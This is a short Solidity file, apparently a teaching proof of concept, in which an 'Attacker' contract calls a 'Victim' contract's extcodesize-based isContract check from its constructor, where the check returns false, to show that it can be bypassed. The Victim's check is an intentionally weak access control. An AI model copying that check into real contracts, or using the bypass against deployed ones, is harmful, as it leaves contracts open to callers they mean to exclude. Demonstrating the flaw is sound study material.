pragma solidity 0.4.25;

contract Victim {

    function isContract() public view returns(bool){
      uint32 size;
      address a = msg.sender;
      assembly {
        size := extcodesize(a)
      }
      return (size > 0);
    }

}

contract Attacker {
    
    bool public iTrickedIt;
    Victim v;
    
    constructor(address _v) public {
        v = Victim(_v);
        
        iTrickedIt = !v.isContract();
    }
}
